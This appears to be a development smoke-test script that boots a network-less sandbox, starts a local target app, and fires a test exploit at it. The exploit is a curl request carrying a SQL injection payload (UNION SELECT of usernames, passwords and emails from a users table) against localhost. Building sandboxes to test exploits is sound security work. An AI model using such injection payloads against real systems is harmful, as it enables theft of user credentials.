/**
 * Manual smoke check for the sandbox runner (dev aid, not part of the app).
 *
 *   node scripts/sandbox-smoke.mjs
 *
 * Boots the sandbox, starts the target inside it, and fires a real exploit
 * from within the network-less container.
 */
import { execInSandbox, startSandbox, startTarget, stopSandbox, waitForTarget } from '../dist/sandbox/runner.js';

const log = (...args) => console.log(...args);

async function main() {
  log('1. starting sandbox');
  const started = await startSandbox();
  log(`   rc=${started.exitCode} ${(started.stdout || started.stderr).trim()}`);

  log('2. starting target inside the sandbox');
  await startTarget();

  const healthy = await waitForTarget(30, 1000);
  log(`   healthy=${healthy}`);
  if (!healthy) {
    const logs = await execInSandbox('cat /tmp/target.log');
    log(logs.stdout);
    await stopSandbox();
    process.exit(1);
  }

  log('3. running an exploit from inside the sandbox');
  const exploit = await execInSandbox(
    [
      'curl -sS -m 5 -G http://127.0.0.1:3000/search',
      `--data-urlencode "q=${"zzz' UNION SELECT id,username,password,email FROM users--"}"`,
    ].join(' '),
  );
  log(`   ${exploit.stdout.trim() || exploit.stderr.trim()}`);

  log('4. stopping sandbox');
  await stopSandbox();
  log('done');
}

main().catch(async (error) => {
  console.error('FAILED:', error instanceof Error ? error.message : error);
  await stopSandbox();
  process.exit(1);
});